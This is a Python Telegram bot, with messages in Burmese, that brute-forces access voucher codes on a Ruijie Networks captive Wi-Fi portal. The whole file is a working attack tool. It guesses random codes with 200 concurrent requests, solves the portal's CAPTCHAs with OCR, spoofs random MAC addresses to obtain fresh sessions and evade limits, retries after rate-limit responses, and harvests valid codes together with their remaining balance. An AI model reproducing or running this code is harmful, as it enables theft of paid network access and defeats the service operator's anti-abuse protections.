import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
from urllib.parse import urlparse
import ipaddress
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID  = os.environ.get("ADMIN_ID", "")

if not BOT_TOKEN or not ADMIN_ID:
    raise ValueError("BOT_TOKEN and ADMIN_ID environment variables are required")

# ── Portal host (Myanmar endpoint) ────────────────────────────────────────
PORTAL_HOST = "portal-mm-as.ruijienetworks.com"
PORTAL_BASE = f"https://{PORTAL_HOST}"

# ── Global structures ─────────────────────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN)

user_data        = {}   # {chat_id: {"session_url": ...}}
scan_tasks       = {}   # {chat_id: {"task": Task, "stop": bool, "scan_id": str}}
success_texts    = {}   # {chat_id: [{"code", "session_id", "plan"}]}
limited_texts    = {}   # {chat_id: [code, ...]}
notify_setting   = {}   # {chat_id: True/False}
last_scan_params = {}   # {chat_id: {"mode","length","target"}}
pending_brute    = {}
success_messages = {}
limited_messages = {}

session    = None
_connector = None
CONCURRENCY  = 200
_voucher_sem = None
_start_time  = time.monotonic()

BRUTE_MODES = {
    "1": {"name": "ဂဏန်းသီးသန့် (0-9)",         "charset": string.digits},
    "2": {"name": "အင်္ဂလိပ်စာလုံးအသေး (a-z)",    "charset": string.ascii_lowercase},
    "3": {"name": "အင်္ဂလိပ်စာလုံးအကြီး (A-Z)",   "charset": string.ascii_uppercase},
    "4": {"name": "စာလုံးအကြီး+အသေး (a-zA-Z)",    "charset": string.ascii_letters},
    "5": {"name": "စာလုံး+ဂဏန်း (a-z, 0-9)",     "charset": string.ascii_lowercase + string.digits},
}

# ── Keep-alive web server ──────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is running!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    try:
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        logger.info(f"Web server started on port {port}")
    except OSError as e:
        logger.warning(f"Web server could not start: {e}")

# ── Helpers ────────────────────────────────────────────────────────────────
def _parse_seconds(val):
    secs  = int(val)
    hours = secs // 3600
    mins  = (secs % 3600) // 60
    return f"{hours}h {mins}m" if hours > 0 else (f"{mins}m" if mins > 0 else f"{secs}s")

def _parse_minutes(val):
    total = int(val)
    if total <= 0: return "0m"
    if total < 60: return f"{total}m"
    h = total // 60; m = total % 60
    if h < 24: return f"{h}h {m}m" if m else f"{h}h"
    d = h // 24; rh = h % 24
    if d < 30: return f"{d}d {rh}h" if rh else f"{d}d"
    mo = d // 30; rd = d % 30
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"

async def get_balance(token):
    urls = [
        f"{PORTAL_BASE}/api/auth/balance/getBalance/{token}",
        f"{PORTAL_BASE}/api/macc2/balance/getBalance/{token}",
    ]
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    for url in urls:
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json(content_type=None)
                candidates = [data]
                for k in ['result', 'data']:
                    if isinstance(data, dict) and isinstance(data.get(k), dict):
                        candidates.append(data[k])
                for d in candidates:
                    if not isinstance(d, dict):
                        continue
                    for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                        if d.get(key) is not None:
                            return _parse_minutes(d[key])
                    for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft']:
                        if d.get(key) is not None:
                            return _parse_seconds(d[key])
        except Exception as e:
            logger.debug(f"get_balance {url}: {e}")
    return "N/A"

def iter_codes(mode, length):
    charset = BRUTE_MODES[str(mode)]["charset"]
    while True:
        yield "".join(random.choice(charset) for _ in range(length))

def format_progress(checked, speed=0, found=0, target=None, mode=None, length=None):
    mode_name = BRUTE_MODES.get(str(mode), {}).get("name", "") if mode else ""
    lines = ["📋 Status: Running"]
    if mode_name:
        lines.append(f"🎯 Mode: {mode_name}")
    if length:
        lines.append(f"📏 Length: {length}")
    lines += [
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🏆 Target: {found}/{target}")
    return "\n".join(lines)

# ── SSRF guard ─────────────────────────────────────────────────────────────
def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return False
        host = parsed.hostname or ""
        if not host:
            return False
        if host.lower() in ("localhost", "0.0.0.0"):
            return False
        try:
            addr = ipaddress.ip_address(host)
            if any([addr.is_loopback, addr.is_private, addr.is_link_local,
                    addr.is_reserved, addr.is_unspecified, addr.is_multicast]):
                return False
        except ValueError:
            pass
        return True
    except Exception:
        return False

# ── CAPTCHA handling ───────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', thresh)
    return _ocr.classification(buf.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac   = [first] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, prev=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=15)) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev
    except Exception as e:
        logger.debug(f"get_session_id: {e}")
        return prev

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': PORTAL_HOST,
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get(
        f'{PORTAL_BASE}/api/auth/captcha/image',
        params=params, headers=headers, timeout=aiohttp.ClientTimeout(total=10)
    ) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': PORTAL_HOST,
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with session_obj.post(
        f'{PORTAL_BASE}/api/auth/captcha/verify',
        headers=headers, json={'sessionId': session_id, 'authCode': text},
        timeout=aiohttp.ClientTimeout(total=10)
    ) as req:
        data = await req.json(content_type=None)
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    if not is_safe_url(session_url):
        return False
    headers = {'accept': 'text/html,*/*;q=0.8',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    try:
        async with session.get(session_url, allow_redirects=False, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=15)) as first:
            location = first.headers.get("Location", "")
            if location and is_safe_url(location):
                async with session.get(location, allow_redirects=False, headers=headers,
                                        timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    return "sessionId" in str(resp.url) or "sessionId" in location
            return "sessionId" in str(first.url) or "sessionId" in location
    except Exception as e:
        logger.error(f"check_session_url: {e}")
        return False

# ── Core voucher check ─────────────────────────────────────────────────────
POST_URL = f"{PORTAL_BASE}/api/auth/voucher/?lang=en_US"

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        ct = scan_tasks.get(chat_id)
        if not ct or ct.get("scan_id") != scan_id:
            return

    response   = None
    session_id = None

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=30)
        ) as ts:
            session_id = await get_session_id(ts, session_url)
            if not session_id:
                continue

            auth_code = None
            for _ in range(8):
                try:
                    img  = await Captcha_Image(ts, session_id)
                    text = await Captcha_Text(img)
                    if text and await Varify_Captcha(ts, session_id, text):
                        auth_code = text
                        break
                except Exception:
                    continue
            if not auth_code:
                continue

            if not recheck:
                ct = scan_tasks.get(chat_id)
                if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
                    return

            data = {"accessCode": code, "sessionId": session_id,
                    "apiVersion": 1, "authCode": auth_code}
            headers = {
                "authority": PORTAL_HOST,
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": PORTAL_BASE,
                "referer": f"{PORTAL_BASE}/download/static/maccauth/src/index.html?sessionId={session_id}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with ts.post(POST_URL, json=data, headers=headers) as req:
                    response = await req.text()
                    logger.info(f"[voucher] code={code} attempt={attempt+1} status={req.status}")
            except Exception as e:
                logger.debug(f"perform_check post: {e}")
                return

        if response and 'request limited' in response:
            logger.warning(f"Rate limited on code={code}, retrying ({attempt+1}/3)")
            await asyncio.sleep(2)
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        plan_str = "N/A"
        try:
            res_data  = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            tm = re.search(r'token=(.*?)&', logon_url)
            token = tm.group(1) if tm else session_id
            fetched = await get_balance(token)
            if fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception:
            pass

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})

        if notify_setting.get(chat_id, True):
            code_line = "\n".join([f"`{i['code']}` – {i['plan']}" for i in success_texts[chat_id]])
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n{code_line}", parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=success_messages[chat_id],
                        text=f"✅ Success Codes:\n{code_line}", parse_mode="Markdown"
                    )
            except Exception:
                pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, True):
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited Codes:\n{limited_line}"
                    )
            except Exception:
                pass

# ── Brute-force runner ─────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                          target=None, message=None, progress_msg=None):
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    checked    = 0
    found      = 0
    scan_start = time.monotonic()
    code_iter  = iter_codes(mode, length)

    try:
        while True:
            ct = scan_tasks.get(chat_id)
            if not ct or ct.get("scan_id") != scan_id:
                return
            if ct.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target}
                scan_tasks.pop(chat_id, None)
                return

            batch = [next(code_iter) for _ in range(500)]

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

            for res in results:
                if res and not isinstance(res, Exception):
                    found += 1
                    if target and found >= target:
                        try:
                            await bot.edit_message_text(
                                chat_id=chat_id, message_id=progress_msg.message_id,
                                text=f"🎯 Target {target} ရောက်ပါပြီ! ရှာဖွေမှုရပ်သည်။"
                            )
                        except Exception:
                            pass
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed   = (checked / elapsed * 60) if elapsed > 0 else 0
            text    = format_progress(checked, speed, found, target, mode, length)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id, text=text
                )
            except Exception:
                try:
                    nm = await bot.send_message(chat_id, text)
                    progress_msg.message_id = nm.message_id
                except Exception:
                    pass

    except asyncio.CancelledError:
        last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target}
    finally:
        scan_tasks.pop(chat_id, None)

# ── Bot commands ───────────────────────────────────────────────────────────
def is_admin(chat_id):
    return str(chat_id) == str(ADMIN_ID)

@bot.message_handler(commands=['start'])
async def cmd_start(message):
    await bot.reply_to(message,
        "🤖 Voucher Bot မှ ကြိုဆိုပါသည်!\n/help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။"
    )

@bot.message_handler(commands=['help'])
async def cmd_help(message):
    await bot.reply_to(message,
        "📖 Voucher Bot အသုံးပြုနည်း လမ်းညွှန်\n\n"
        "၁။ Setup:\n"
        "   /setup <url>\n\n"
        "၂။ ရှာဖွေခြင်း:\n"
        "   /brute <mode> <length> [target]\n"
        "   Mode:\n"
        "     1 = ဂဏန်းသီးသန့် (0-9)\n"
        "     2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "     3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
        "     4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
        "   ဥပမာ: /brute 1 6 5\n\n"
        "၃။ /status  – အခြေအနေကြည့်\n"
        "၄။ /stop    – ရပ်တန့်ခြင်း\n"
        "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
        "၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
        "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
        "၉။ /notify  – Notification ON/OFF"
    )

@bot.message_handler(commands=['setup'])
async def cmd_setup(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup <session_url>")
        return
    url     = args[1].strip()
    chat_id = message.chat.id
    await bot.reply_to(message, "⏳ Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        user_data[chat_id] = {'session_url': url}
        success_texts.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        pending_brute.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ!\n/brute ဖြင့် စတင်နိုင်ပါပြီ။")
    else:
        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည် (သို့) sessionId မတွေ့ပါ။")

@bot.message_handler(commands=['brute'])
async def cmd_brute(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း:\n/brute <mode> <length> [target]\n\n"
            "ဥပမာ:\n/brute 1 6\n/brute 1 6 5")
        return

    mode_str = args[1]
    if mode_str not in BRUTE_MODES:
        await bot.reply_to(message, "❌ Mode မမှန်ပါ။ 1-5 အကြား ရွေးပါ။")
        return
    try:
        length = int(args[2])
        if not 1 <= length <= 20:
            raise ValueError
    except ValueError:
        await bot.reply_to(message, "❌ Length သည် 1-20 ကြား ဂဏန်းဖြစ်ရပါမည်။")
        return
    target = None
    if len(args) >= 4:
        try:
            target = int(args[3])
        except ValueError:
            await bot.reply_to(message, "❌ Target သည် ဂဏန်းဖြစ်ရပါမည်။")
            return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ ရှာဖွေမှု မပြီးသေးပါ။ /stop ဦးသုံးပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("▶️ Resume", callback_data="resume_scan"),
            InlineKeyboardButton("🆕 New Scan", callback_data="new_scan")
        )
        pending_brute[chat_id] = {"mode": mode_str, "length": length, "target": target}
        prev = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode:{prev['mode']} length:{prev['length']}).\nပြန်စမလား, အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode_str, length, target, message)

async def start_brute_scan(chat_id, mode, length, target, original_message):
    mode_name    = BRUTE_MODES[str(mode)]["name"]
    target_note  = f" | Target: {target}" if target else ""
    progress_msg = await bot.send_message(
        chat_id,
        f"🔍 ရှာဖွေမှု စတင်သည်\n🎯 Mode: {mode_name}\n📏 Length: {length}{target_note}"
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(int(mode), length, chat_id,
                       user_data[chat_id]['session_url'],
                       scan_id, target,
                       message=original_message,
                       progress_msg=progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။",
                                         chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("▶️ ယခင် scan ပြန်စပါပြီ။",
                                     chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], call.message)
    else:
        params = pending_brute.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        if params:
            await bot.edit_message_text("🆕 Scan အသစ်စတင်ပါပြီ။",
                                         chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], call.message)
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။",
                                         chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['stop'])
async def cmd_stop(message):
    if not is_admin(message.chat.id): return
    data = scan_tasks.get(message.chat.id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "⏹️ ရပ်ပြီးပါပြီ။ /resume ဖြင့် ဆက်နိုင်သည်။")
    else:
        await bot.reply_to(message, "⚠️ ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def cmd_resume(message):
    if not is_admin(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "⚠️ ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], message)
    await bot.reply_to(message, "▶️ ယခင် scan ပြန်စပါပြီ။")

@bot.message_handler(commands=['status'])
async def cmd_status(message):
    if not is_admin(message.chat.id): return
    chat_id = message.chat.id
    data    = scan_tasks.get(chat_id)
    found   = len(success_texts.get(chat_id, []))
    if not data or data["task"].done():
        await bot.reply_to(message, f"⚠️ ရှာဖွေမှု မရှိပါ။\n💎 Found so far: {found}")
        return
    uptime = int(time.monotonic() - _start_time)
    h, r   = divmod(uptime, 3600); m, s = divmod(r, 60)
    await bot.reply_to(message,
        f"📋 Status: Running\n💎 Found: {found}\n⏱ Uptime: {h}h {m}m {s}s"
    )

@bot.message_handler(commands=['saved'])
async def cmd_saved(message):
    if not is_admin(message.chat.id): return
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "⚠️ ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return
    parts = []
    if success:
        parts.append(f"✅ Success Codes ({len(success)})")
        for item in success:
            parts.append(f"`{item['code']}` – {item.get('plan', 'N/A')}")
    if limited:
        parts.append(f"\n⚠️ Limited Codes ({len(limited)})")
        parts.extend(limited)
    full_text = "\n".join(parts)
    for i in range(0, len(full_text), 4096):
        await bot.send_message(chat_id, full_text[i:i+4096], parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
async def cmd_delete_saved(message):
    if not is_admin(message.chat.id): return
    chat_id = message.chat.id
    count   = len(success_texts.get(chat_id, [])) + len(limited_texts.get(chat_id, []))
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    await bot.reply_to(message, f"✅ Code {count} ခု ဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def cmd_notify(message):
    if not is_admin(message.chat.id): return
    chat_id = message.chat.id
    notify_setting[chat_id] = not notify_setting.get(chat_id, True)
    await bot.reply_to(message, f"📢 Notification: {'ON ✅' if notify_setting[chat_id] else 'OFF ❌'}")

@bot.message_handler(commands=['recheck'])
async def cmd_recheck(message):
    if not is_admin(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "⚠️ Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.reply_to(message, "⏳ Success codes ပြန်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        recode = await perform_check(
            user_data[chat_id]['session_url'], item["code"], chat_id, recheck=True
        )
        if recode:
            new_success.append(item)
    success_texts[chat_id] = new_success
    await bot.reply_to(message,
        f"✅ Recheck ပြီး {len(new_success)} ခု ကျန်ပါသည်။" if new_success
        else "Recheck ပြီးပါပြီ။ Success code တစ်ခုမျှ မကျန်ပါ။"
    )

# ── Polling and main ──────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception as e:
            logger.warning(f"Polling error: {e}. Retrying in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300)
    session    = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector, connector_owner=False
    )
    logger.info("🚀 Voucher Bot starting...")
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
